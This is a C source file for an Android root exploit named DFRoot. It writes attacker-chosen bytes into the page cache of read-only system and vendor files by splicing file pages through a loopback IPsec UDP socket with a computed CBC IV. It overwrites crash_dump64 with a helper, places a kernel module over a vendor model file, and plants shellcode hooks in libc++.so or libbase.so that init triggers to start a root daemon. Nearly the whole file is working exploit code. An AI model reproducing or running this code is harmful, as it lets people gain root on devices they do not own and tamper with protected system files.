/* Modified 2026-11-17 (DFRoot GZIF): .incbin reduced to dfroot-android13-5.15.ko; KO_TARGET_CANDIDATES reduced to /vendor/lib64/AIAwbModel_v2.2.tflite. See NOTICE. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "aes256.h"
#include "status_protocol.h"

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
static char    *libcxx_ko_target;

static int      g_encap_port;
static int      g_sender_port;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint32_t g_seq = 1;
struct PatchRestore {
    const char *lib;
    uint64_t    tramp_aligned;
    uint8_t     tramp_orig[16];
    uint64_t    shell_off;
    uint32_t    shell_padded;
    char        shell_orig[1024];
    int         valid;
};

static struct PatchRestore g_libcxx_r;

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
 * Pass mode="r" for read, NULL for write-splice.
 * Returns waitpid status, or -1 if clone fails (already logged).
 */
static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const char *mode)
{
    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
        if (mode)
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, mode, NULL);
        else
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
        _exit(1);
    }
    int st = 0;
    pid_t w = TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
    if (w < 0) {
        printf("waitpid failed: %s\n", strerror(errno));
        return -1;
    }
    return st;
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 */
static int read_vendor_content(off_t offset, uint8_t buf[16]) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }

    int status = spawn_crash_dump(offset, rdpipe[1], 0, "r");
    close(rdpipe[1]);
    int n = 0;
    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
    close(rdpipe[0]);
    if (status < 0) return -1;
    if (n != 16) {
        if (WIFEXITED(status)) {
            static const char *const exit_meanings[] = {
                [0] = "success",
                [1] = "open vendor file failed or read returned < 16 bytes",
                [2] = "write to pipe returned < 16 bytes",
                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
                /* These are crash_dump64/splicehelper exit codes only (0..3).
                 * rc=4 is reported by the App's marker domain, not a helper
                 * exit code; it is never part of this table. */
            };
            int ec = WEXITSTATUS(status);
            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
            printf("read_vendor at 0x%lx got %d bytes: %s\n",
                     (long)offset, n, meaning);
        } else if (WIFSIGNALED(status))
            printf("read_vendor at 0x%lx got %d bytes: signal %d\n",
                     (long)offset, n, WTERMSIG(status));
        else
            printf("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
                     (long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC write.
 * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
 * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
 * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
 */
static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
                            const uint8_t iv[16], int use_helper) {
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(g_seq++);
    memcpy(hdr + 8, iv, 16);

    struct iovec iov = {.iov_base = hdr, .iov_len = 24};
    /* hdr is a stack buffer: SPLICE_F_GIFT would promise the pages are never
     * modified again, which is false here. A normal vmsplice already pins the
     * pages for the splice into the UDP socket. */
    if (vmsplice(pipe_wr, &iov, 1, 0) != 24) {
        printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
    }

    if (use_helper) {
        int st = spawn_crash_dump(offset, pipe_wr, 1, NULL);
        if (st < 0) return -1;
        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            printf("splice helper failed status=0x%x\n", st);
            return -1;
        }
    } else {
        off_t off = offset;
        if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
            printf("splice file failed: %s\n", strerror(errno)); return -1;
        }
    }

    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
    return 0;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * For system files (use_helper=0): reads old_content with pread().
 * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
 * len must be a multiple of 16.
 */
static int patch_file_cbc(const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper) {
    if (len % 16 != 0) {
        printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { printf("socket failed: %s\n", strerror(errno)); return -1; }
    int opt = 1;
    setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in src = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_sender_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0) {
        /* Fail loud: a bind failure means the UDP channel is broken. Java
         * closes its DatagramSocket before native binds the same port (a
         * small race), so in the controlled environment this should succeed;
         * if it does not, continuing would only send packets to nowhere. */
        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
        close(sk_send);
        return -1;
    }
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_encap_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        printf("connect failed: %s\n", strerror(errno));
        close(sk_send); return -1;
    }

    int file_fd = -1;
    if (!use_helper) {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            printf("open %s failed: %s\n", path, strerror(errno));
            close(sk_send); return -1;
        }
    }

    int pfd[2];
    if (pipe(pfd) < 0) {
        printf("pipe failed: %s\n", strerror(errno));
        if (!use_helper) close(file_fd);
        close(sk_send);
        return -1;
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (use_helper) {
            if (read_vendor_content(off, old_content) < 0) {
                rc = -1; break;
            }
        } else {
            if (pread(file_fd, old_content, 16, off) != 16) {
                printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
                rc = -1; break;
            }
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
            printf("write #%zu at 0x%lx failed\n", i, (long)off);
            rc = -1; break;
        }
    }

    close(pfd[0]); close(pfd[1]);
    if (!use_helper) close(file_fd);
    close(sk_send);
    if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
    return rc;
}

/* ---- KO and splicehelper blobs ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;

asm(
    ".section .rodata\n"
    ".global dfroot_ko_13_5_15_start\n.global dfroot_ko_13_5_15_end\n"
    "dfroot_ko_13_5_15_start:\n.incbin \"ko/dfroot-android13-5.15.ko\"\ndfroot_ko_13_5_15_end:\n"
);

/* Path to the generated splicehelper blob. CMake points this at the build
 * directory so no generated bytes live in the source tree; keep a relative
 * fallback for standalone/assembler-only builds. */
#ifndef DFROOT_SPLICEHELPER_PATH
#define DFROOT_SPLICEHELPER_PATH "splicehelper"
#endif

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"" DFROOT_SPLICEHELPER_PATH "\"\nsplice_helper_end:\n"
);

extern char dfroot_ko_13_5_15_start[], dfroot_ko_13_5_15_end[];
extern char splice_helper_start[], splice_helper_end[];

struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };

static const struct KoImage *select_ko_image(int andr, int major, int minor) {
    static const struct KoImage imgs[] = {
        {13, 5, 15, dfroot_ko_13_5_15_start, dfroot_ko_13_5_15_end},
    };
    const struct KoImage *fb = NULL;
    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
        if (imgs[i].android_release == andr) return &imgs[i];
        if (!fb) fb = &imgs[i];
    }
    return fb;
}

static int read_device_versions(int *andr, int *major, int *minor) {
    struct utsname u;
    /* Kept at function scope: m = release below is used after the if-block,
     * so a block-scoped release[] would be a dangling pointer (UB). */
    char vendor_ver[5] = {0};
    char release[15];
    if (uname(&u) != 0) return -1;
    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
    const char *m = strstr(u.release, "android");
    if (!m) {
        printf("uname -r is missing Android version, trying getprop\n");

        /* Vendor kernel tags can be frozen at an older Android release while
         * the OS has been upgraded; fall back to the generic property. */
        static const char *const props[] = {
            "ro.vendor.build.version.release",
            "ro.build.version.release",
        };
        int got = 0;
        for (size_t i = 0; i < sizeof(props) / sizeof(props[0]); i++) {
            char cmd[80];
            snprintf(cmd, sizeof(cmd), "getprop %s", props[i]);
            FILE *f = popen(cmd, "r");
            if (!f) continue;
            char line[32];
            if (fgets(line, sizeof(line), f) != NULL) {
                line[strcspn(line, "\r\n")] = '\0';
                size_t ll = strlen(line);
                int ok = ll > 0 && ll < sizeof(vendor_ver);
                for (size_t k = 0; ok && k < ll; k++)
                    if (!isdigit((unsigned char)line[k])) ok = 0;
                int pst = pclose(f);
                if (ok && pst == 0) {
                    memcpy(vendor_ver, line, ll + 1);
                    got = 1;
                    break;
                }
            } else {
                pclose(f);
            }
        }
        if (!got) {
            printf("getprop failed to read Android version\n");
            return -1;
        }
        snprintf(release, sizeof(release), "android%s", vendor_ver);
        m = release;
    }
    const char *avp = m + 7;
    if (!isdigit((unsigned char)*avp)) return -1;
    char *endp = NULL;
    errno = 0;
    long av = strtol(avp, &endp, 10);
    if (errno == ERANGE || endp == avp || av <= 0 || av > 100) return -1;
    *andr = (int)av;
    return 0;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}

/* Write splicehelper into crash_dump64 page cache. */
static int patch_helper(void) {
    size_t len;
    char *buf = pad16(splice_helper_start,
                      (size_t)(splice_helper_end - splice_helper_start), &len);
    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }

    uint8_t verify[16];
    int vfd = open(kCrashDump, O_RDONLY);
    if (vfd < 0) {
        printf("patch: crash_dump64 verification open failed: %s\n", strerror(errno));
        free(buf);
        return -1;
    }
    ssize_t n = pread(vfd, verify, 16, 16);
    close(vfd);
    if (n != 16) {
        if (n < 0)
            printf("patch: crash_dump64 verification read failed: %s\n", strerror(errno));
        else
            printf("patch: crash_dump64 verification short read: got %zd bytes\n", n);
        free(buf);
        return -1;
    }
    if (memcmp(verify, buf + 16, 16) != 0) {
        printf("patch: crash_dump64 verification failed\n");
        printf("patch: DEVICE NOT VULNERABLE\n");
        free(buf);
        return -1;
    }
    free(buf);
    return 0;
}

static int patch_ko(void) {
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        printf("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
    }
    const struct KoImage *ko = select_ko_image(andr, major, minor);
    if (!ko) {
        printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
    }
    printf("Using KMI: android%d-%d.%d\n",
             ko->android_release, ko->kver_major, ko->kver_minor);

    size_t len;
    char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
    free(buf);
    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
    return ret;
}

static void cleanup(void) {
    if (!g_libcxx_r.valid) return;
    printf("\n=== cleanup ===\n");
    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
                   (size_t)g_libcxx_r.tramp_aligned, 0);
    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
                   (size_t)g_libcxx_r.shell_off, 0);
}

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     size_t shellcode_size);

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy, struct PatchRestore *restore) {
    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);

    if (first_inst_copy < stage_data ||
        (size_t)(first_inst_copy - stage_data) + 4 > stage_len) {
        printf("patch: %s first_inst_copy out of range\n", lib);
        return -1;
    }

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }

    if (padded > sizeof(restore->shell_orig)) {
        printf("shellcode too large to save (%zu)\n", padded);
        free(buf); return -1;
    }

    uint64_t hook_off, shell_off; uint32_t first_insn;
    printf("Finding symbol offsets for %s:\n", lib);
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
    }
    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);

    if ((hook_off & 3) != 0) {
        printf("patch: %s hook not 4-byte aligned\n", lib);
        free(buf); return -1;
    }

    int pos = (int)(hook_off & 15);
    if (pos > 12) {
        printf("patch: %s hook at 0x%lx leaves only %d bytes in trampoline block\n",
               lib, (unsigned long)hook_off, 16 - pos);
        free(buf); return -1;
    }

    long long delta1 = (long long)(shell_off + start_delta) - (long long)hook_off;
    if (delta1 % 4 != 0) {
        printf("patch: %s branch delta1 not divisible by 4\n", lib);
        free(buf); return -1;
    }
    if (delta1 < -0x07FFFFFCLL || delta1 > 0x07FFFFFCLL) {
        printf("patch: %s branch delta1 out of range\n", lib);
        free(buf); return -1;
    }
    uint32_t hook_insn = BRANCH | (((unsigned long long)delta1 >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) {
        printf("%s already patched\n", lib); free(buf); return 0;
    }

    long long delta2 = (long long)(hook_off + 4) - (long long)(shell_off + stage_len - 4);
    if (delta2 % 4 != 0) {
        printf("patch: %s branch delta2 not divisible by 4\n", lib);
        free(buf); return -1;
    }
    if (delta2 < -0x07FFFFFCLL || delta2 > 0x07FFFFFCLL) {
        printf("patch: %s branch delta2 out of range\n", lib);
        free(buf); return -1;
    }
    uint32_t jmpback = BRANCH | (((unsigned long long)delta2 >> 2) & 0x3ffffff);

    *(uint32_t *)&buf[stage_len - 4] = jmpback;
    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;

    uint64_t aligned = hook_off & ~(uint64_t)15;
    int fd = open(lib, O_RDONLY);
    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
    int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
          && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
    close(fd);
    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }

    restore->lib           = lib;
    restore->shell_off     = shell_off;
    restore->shell_padded  = (uint32_t)padded;
    restore->tramp_aligned = aligned;
    restore->valid         = 1;

    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
    free(buf);
    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }

    uint8_t blk[16];
    memcpy(blk, restore->tramp_orig, 16);
    memcpy(&blk[pos], &hook_insn, 4);
    printf("patch: %s <- trampoline (16 bytes)\n", lib);
    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
    return ret2;
}

static int createOrphanProcess(void) {
    printf("Triggering hook...\n");
    int pid = fork();
    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    if (TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0)) < 0) {
        printf("waitpid orphan failed: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

static const char *detect_ko_target(void) {
    static const char *const candidates[] = {
        "/vendor/lib64/AIAwbModel_v2.2.tflite",
    };
    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        if (access(candidates[i], F_OK) == 0)
            return candidates[i];
    }
    return NULL;
}

/* Caller has already validated both characters with isxdigit(). */
static int hex_nibble(unsigned char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return c - 'A' + 10;
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
    if (strlen(hex) != len * 2) return -1;
    for (size_t i = 0; i < len; i++) {
        unsigned char hi = (unsigned char)hex[i * 2];
        unsigned char lo = (unsigned char)hex[i * 2 + 1];
        if (!isxdigit(hi) || !isxdigit(lo)) return -1;
        out[i] = (uint8_t)((hex_nibble(hi) << 4) | hex_nibble(lo));
    }
    return 0;
}

static void usage(const char *argv0) {
    fprintf(stderr,
            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
}

/* Bionic at minSdk 32 provides neither explicit_bzero() nor memset_s();
 * writing through a volatile pointer keeps the wipe from being optimized out. */
static void clear_secret(void *p, size_t n) {
    volatile unsigned char *v = (volatile unsigned char *)p;
    while (n--) *v++ = 0;
}

static int parse_port(const char *s, int *out) {
    char *end;
    if (s == NULL || !isdigit((unsigned char)s[0])) return -1;
    errno = 0;
    unsigned long v = strtoul(s, &end, 10);
    if (errno == ERANGE || end == s || *end != '\0' || v < 1 || v > 65535)
        return -1;
    *out = (int)v;
    return 0;
}

static int parse_spi(const char *s, uint32_t *out) {
    char *end;
    if (s == NULL || !isdigit((unsigned char)s[0])) return -1;
    errno = 0;
    unsigned long v = strtoul(s, &end, 10);
    if (errno == ERANGE || end == s || *end != '\0' || v == 0 || v > UINT32_MAX)
        return -1;
    *out = (uint32_t)v;
    return 0;
}

static int setup(int argc, char **argv) {
    int encap_port = 0, sender_port = 0;
    uint32_t spi = 0;
    uint8_t aes_key[32];
    int have_aes = 0, have_encap = 0, have_sender = 0, have_spi = 0;
#define USAGE_FAIL() do { usage(argv[0]); clear_secret(aes_key, sizeof(aes_key)); return 2; } while (0)

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "--encap-port") && i + 1 < argc) {
            if (have_encap) { USAGE_FAIL(); }
            if (parse_port(argv[++i], &encap_port)) { USAGE_FAIL(); }
            have_encap = 1;
        } else if (!strcmp(a, "--sender-port") && i + 1 < argc) {
            if (have_sender) { USAGE_FAIL(); }
            if (parse_port(argv[++i], &sender_port)) { USAGE_FAIL(); }
            have_sender = 1;
        } else if (!strcmp(a, "--spi") && i + 1 < argc) {
            if (have_spi) { USAGE_FAIL(); }
            if (parse_spi(argv[++i], &spi)) { USAGE_FAIL(); }
            have_spi = 1;
        } else if (!strcmp(a, "--aes-key") && i + 1 < argc) {
            if (have_aes) { USAGE_FAIL(); }
            /* Residual risk: the key is still passed as argv (visible in
             * /proc/<pid>/cmdline). Java branch 2 is unchanged to avoid a
             * cross-branch conflict; a full fix needs Java to hand the key
             * over via fd/pipe and native to read it there. The CLI format
             * stays unchanged so that contract is not broken. */
            if (hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) != 0) {
                USAGE_FAIL();
            }
            have_aes = 1;
        } else { USAGE_FAIL(); }
    }
    if (!have_encap || !have_sender || !have_spi || !have_aes) {
        USAGE_FAIL();
    }

    g_encap_port  = encap_port;
    g_sender_port = sender_port;
    g_spi         = spi;
    g_seq         = 1;
    memcpy(g_aes_key, aes_key, 32);
    clear_secret(aes_key, sizeof(aes_key));

    const char *ko_target = detect_ko_target();
    if (!ko_target) {
        printf("no KO target exists; expected /vendor/lib64/AIAwbModel_v2.2.tflite\n");
        clear_secret(g_aes_key, sizeof(g_aes_key));
        return 2;
    }
    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
    strncpy(libcxx_ko_target, ko_target, 63);
    libcxx_ko_target[63] = '\0';

    printf("=== setup ===\n");
    printf("found ko_target: %s\n", ko_target);
    printf("encap port: %d\n", encap_port);
    printf("spi: 0x%x\n", spi);
#undef USAGE_FAIL
    return 0;
}

/* ---- Consumer-side status_io operations ----
 * The app only reads the single atomically published /dev/dffinal outcome.
 * Progress markers are logged once each for diagnostics and are NEVER used to
 * derive the result (no marker precedence, no "root verified" claim). */
#define DF_FINAL_PATH "/dev/dffinal"

static const struct {
    const char *path;
    const char *msg;
} kProgressMarkers[] = {
    { "/dev/df",   "progress: hook armed (/dev/df)" },
    { "/dev/dfm0", "progress: kernel module launched bootstrap" },
    { "/dev/dfm1", "progress: bootstrap loading preferences" },
    { "/dev/dfm2", "progress: bootstrap cloning zygote env" },
    { "/dev/dfm3", "progress: bootstrap setting partitions ro" },
    { "/dev/dfm4", "progress: bootstrap disabling ksu modules" },
    { "/dev/dfm5", "progress: bootstrap starting SU daemon" },
    { "/dev/dfmw0", "progress: warning - clone zygote env failed" },
    { "/dev/dfmw1", "progress: warning - set partitions ro failed" },
};
static int progress_seen[sizeof(kProgressMarkers) / sizeof(kProgressMarkers[0])];

/* Negative = clock failure. status_protocol treats it as ERR so the consumer
 * cannot freeze on a sentinel 0 and wait forever (fail closed). */
static int64_t exp_now_ms(void *ctx)
{
    struct timespec ts;
    (void)ctx;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0 ||
        ts.tv_sec < 0) return -1;
    return (int64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void exp_sleep_ms(void *ctx, int ms)
{
    (void)ctx;
    if (ms > 0) usleep((unsigned int)ms * 1000);
}

static void exp_report(void *ctx, const char *msg)
{
    (void)ctx;
    printf("%s\n", msg);
}

static int exp_read_final(void *ctx, char *buf, size_t cap)
{
    size_t i;
    int fd, n;
    (void)ctx;

    for (i = 0; i < sizeof(kProgressMarkers) / sizeof(kProgressMarkers[0]); i++) {
        if (!progress_seen[i] && access(kProgressMarkers[i].path, F_OK) == 0) {
            progress_seen[i] = 1;
            printf("%s\n", kProgressMarkers[i].msg);
        }
    }

    if (!buf || cap == 0) return -1;
    fd = open(DF_FINAL_PATH, O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
    if (fd < 0) return -1; /* unavailable: consumer keeps polling */
    n = (int)read(fd, buf, cap - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return 0;
}

/* The consumer never publishes; these are fail-closed no-ops kept so the
 * injected vtable is complete. They are never called on the consumer path. */
static int exp_publish_final(void *ctx, const char *token)
{
    (void)ctx; (void)token; return -1;
}
static int exp_late_load_state(void *ctx)
{
    (void)ctx; return -1; /* unknown */
}
static int exp_wait_child(void *ctx, int timeout_ms)
{
    (void)ctx; (void)timeout_ms; return -1;
}

static void status_cleanup_cb(void *ctx)
{
    (void)ctx;
    cleanup();
}

static int exploit(void) {
    printf("\n=== exploit (patching files) ===\n");

    int rc = 3;
    if (patch_helper()) goto done;
    if (patch_ko()) goto done;
    int hook_rc = patch_hook("/system/lib64/libc++.so",
                             "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                             &g_libcxx_r);
    /* Target selection returns 1 before writing. libbase's logging destructor
     * also runs when init reaps an orphan, and may have more executable slack. */
    if (hook_rc == 1)
        hook_rc = patch_hook("/system/lib64/libbase.so",
                             "_ZN7android4base10LogMessageD1Ev",
                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                             &g_libcxx_r);
    if (hook_rc) goto done;

    rc = 2;
    usleep(500000);
    
    printf("\n=== init  ===\n");
    createOrphanProcess();

    {
        struct status_io io;
        enum df_outcome outcome = DF_OUTCOME_NONE;
        enum df_wait_result wait;

        memset(&io, 0, sizeof(io));
        io.now_ms          = exp_now_ms;
        io.sleep_ms        = exp_sleep_ms;
        io.read_final      = exp_read_final;
        io.publish_final   = exp_publish_final;
        io.late_load_state = exp_late_load_state;
        io.wait_child      = exp_wait_child;
        io.report          = exp_report;

        /* 70 s budget covers the 60 s late-load wait plus slack. The child
         * (soft-reboot) wait is 5 s; allow a 10 s grace after ROOT_ONLY so a
         * refinement arriving near the end of that child wait is still inside
         * the consumer's window (5 s grace ended exactly at the child's 5 s
         * deadline and could miss it). The flow releases the patched files
         * exactly once on observation or timeout, so cleanup is never delayed
         * until main() returns. */
        wait = status_flow_run(&io, NULL, 70000, 10000, status_cleanup_cb, &outcome);
        printf("status: %s (rc=%d)\n",
               wait == DONE ? "final status observed" :
               wait == TIMEOUT ? "timeout waiting for final status" : "status error",
               df_outcome_to_rc(outcome));
        rc = df_outcome_to_rc(outcome);
    }
    return rc;
done:
    /* No bootstrap was launched (patch failure), so no final status will ever
     * be published. Release the patched files here rather than waiting out a
     * 70 s budget with no possible terminal observation. */
    cleanup();
    printf("patch: ERROR - failed to patch files\n");
    return 3;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (setup(argc, argv) != 0) return 2;
    /* exploit()/status_flow_run() owns cleanup exactly once. */
    int rc = exploit();
    clear_secret(g_aes_key, sizeof(g_aes_key));
    return rc;
}
